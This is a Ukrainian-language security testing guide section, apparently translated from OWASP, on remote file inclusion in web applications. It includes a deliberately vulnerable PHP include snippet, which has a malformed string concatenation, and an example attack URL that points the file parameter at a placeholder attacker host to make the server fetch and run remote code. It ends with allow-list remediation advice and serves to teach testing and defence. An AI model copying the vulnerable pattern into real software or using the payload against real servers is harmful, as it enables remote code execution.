## Тестування віддаленого включення файлів
###  Короткі відомості
Вразливість включення файлів дозволяє зловмиснику включити файл, зазвичай використовуючи механізми динамічного включення файлів, реалізовані в цільовому додатку. Уразливість виникає через використання введених користувачем даних без належної перевірки.

Це може призвести до чогось на зразок виведення вмісту файлу, але в залежності від серйозності це також може призвести до:

- Виконання коду на веб-сервері
- Виконання коду на стороні клієнта, такого як JavaScript, що може призвести до інших атак, таких як міжсайтовий скриптинг (XSS)
- Відмова в обслуговуванні (DoS)
- Розкриття конфіденційної інформації
- Віддалене включення файлів (також відоме як RFI) - це процес включення віддалених файлів за допомогою вразливих процедур включення, реалізованих у додатку. Ця вразливість виникає, наприклад, коли сторінка отримує як вхідні дані шлях до файлу, який має бути включений, і ці вхідні дані не очищаються належним чином, що дозволяє впровадити зовнішню URL-адресу. Хоча більшість прикладів вказують на вразливі PHP-скрипти, слід пам'ятати, що це також поширене в інших технологіях, таких як JSP, ASP та інші.

### Як перевірити
Оскільки RFI виникає, коли шляхи, передані в оператори "include", не очищені належним чином, у підході тестування "чорної скриньки" нам слід шукати сценарії, які приймають імена файлів як параметри. Розглянемо наступний приклад PHP:

````
$incfile = $_REQUEST["файл"];
include($incfile..php");
````
У цьому прикладі шлях витягується з HTTP-запиту, і жодна перевірка введення не виконується (наприклад, шляхом перевірки введення за списком дозволів), тому цей фрагмент коду стає вразливим для цього типу атаки. Розглянемо наступну URL-адресу:

```http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page```

У цьому випадку віддалений файл буде включений, і будь-який код, який міститься в ньому, буде виконуватися сервером.

### Виправлення
Найбільш ефективне рішення для усунення вразливостей, пов'язаних із включенням файлів, полягає в тому, щоб уникати передачі введених користувачем даних будь-якої API файлової системи/фреймворку. Якщо це неможливо, програма може підтримувати список дозволених файлів, які можуть бути включені на сторінку, а потім використовувати ідентифікатор (наприклад, порядковий номер) для доступу до вибраного файлу. Будь-який запит, що містить неприпустимий ідентифікатор, повинен бути відхилений, таким чином зловмисники не можуть маніпулювати шляхом.
